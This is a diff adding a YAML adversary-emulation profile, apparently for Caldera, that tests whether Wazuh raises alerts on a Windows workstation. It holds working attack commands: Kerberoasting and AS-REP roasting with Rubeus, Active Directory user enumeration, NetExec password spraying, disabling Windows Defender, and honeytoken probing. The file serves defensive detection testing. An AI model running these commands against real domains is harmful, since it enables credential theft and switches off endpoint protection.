@@ -1,0 +1,108 @@
+id: 076a5860-03f0-4d21-909d-b662d1df939d
+name: CORP - Teste de alertas Windows (workstation)
+description: ---
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- d34c2fa6-0093-42a3-9626-3917124628c3
+- e88f4548-aa30-4371-8fc6-e93c8705904c
+- 81211716-a933-459d-b065-832a58539a06
+- 90a6c959-ae43-410d-8b5c-79b27cbee1a5
+- 004179fa-7c4c-4d76-ab05-f6f1cbe0e538
+- 9ad0e1c5-7a65-4b44-bff1-f98a81411545
+- e2df09ce-1f7c-4592-a3f0-f901e9b31c38
+- c4ceb408-0b25-4714-ac01-3ef5d0d90388
+- d5650cfc-3677-430d-816d-7a5a71a06428
+abilities:
+ d34c2fa6-0093-42a3-9626-3917124628c3:
+  name:  [CORP] [Wazuh] [110002] Kerberoasting utilizando Rubeus
+  tactic:  credential-access
+  technique_name:  "Steal or Forge Kerberos Tickets: Kerberoasting"
+  technique_id:  T1558.003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       .\Rubeus.exe kerberoast /simple /rc4opsec
+ e88f4548-aa30-4371-8fc6-e93c8705904c:
+  name:  [CORP] [Wazuh] [110004] AS-REP Roasting utilizando Rubeus
+  tactic:  credential-access
+  technique_name:  "Steal or Forge Kerberos Tickets: AS-REP Roasting"
+  technique_id:  T1558.004
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       .\Rubeus.exe asreproast /format:hashcat /aes
+ 81211716-a933-459d-b065-832a58539a06:
+  name:  [CORP] Enumeração de usuários do Active Directory
+  tactic:  discovery
+  technique_name:  "Account Discovery: Domain Account"
+  technique_id:  T1087.002
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Import-Module ActiveDirectory;
+       $Path = "$PWD\#{corp.domain.users}";
+       Get-ADUser -Filter * | Select-Object -ExpandProperty sAMAccountName | Out-File -Encoding ASCII $Path;
+       Write-Host $Path;
+ 90a6c959-ae43-410d-8b5c-79b27cbee1a5:
+  name:  [CORP] [Wazuh] [110007] Password Spray usando NetExec (LDAP/Kerberos)
+  tactic:  credential-access
+  technique_name:  "Brute Force: Password Spraying"
+  technique_id:  T1110.003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       .\nxc.exe ldap #{corp.domain.dc}.#{corp.domain} -u $PWD\#{corp.domain.users} -p "#{corp.domain.wrongpass}" -d #{corp.domain} -k
+ 004179fa-7c4c-4d76-ab05-f6f1cbe0e538:
+  name:  [CORP] [Wazuh] [110007] Password Spray usando NetExec (LDAP/NTLM)
+  tactic:  credential-access
+  technique_name:  "Brute Force: Password Spraying"
+  technique_id:  T1110.003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       .\nxc.exe ldap #{corp.domain.dc}.#{corp.domain} -u $PWD\#{corp.domain.users} -p "#{corp.domain.wrongpass}" -d #{corp.domain}
+ 9ad0e1c5-7a65-4b44-bff1-f98a81411545:
+  name:  [CORP] [Wazuh] [110008] Autenticação bem sucedida no domínio
+  tactic:  credential-access
+  technique_name:  "Valid Accounts: Domain Accounts"
+  technique_id:  T1078.002
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       .\nxc.exe ldap #{corp.domain.dc}.#{corp.domain} -u #{corp.domain.validuser} -p "#{corp.domain.validpass}" -d #{corp.domain}
+ e2df09ce-1f7c-4592-a3f0-f901e9b31c38:
+  name:  [CORP] [Wazuh] [110022] Desativar Windows Defender
+  tactic:  defense-evasion
+  technique_name:  "Impair Defenses: Disable or Modify Tools"
+  technique_id:  T1562.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -Verbose;
+ c4ceb408-0b25-4714-ac01-3ef5d0d90388:
+  name:  [CORP] [Wazuh] [110030] Ler script de honeytoken
+  tactic:  discovery
+  technique_name:  "Command and Scripting Interpreter: PowerShell"
+  technique_id:  T1059.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       type \\#{corp.domain}\NETLOGON\CriaDiscoRede_Estacoes.ps1
+ d5650cfc-3677-430d-816d-7a5a71a06428:
+  name:  [CORP] [Wazuh] [110031] Tentativa de autenticação da conta honeytoken
+  tactic:  discovery
+  technique_name:  "Valid Accounts: Domain Accounts"
+  technique_id:  T1078
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       (New-Object DirectoryServices.DirectoryEntry "","#{corp.domain}\#{corp.domain.honeytokenuser}","test3@tar3f4$").psbase.name -ne $null;
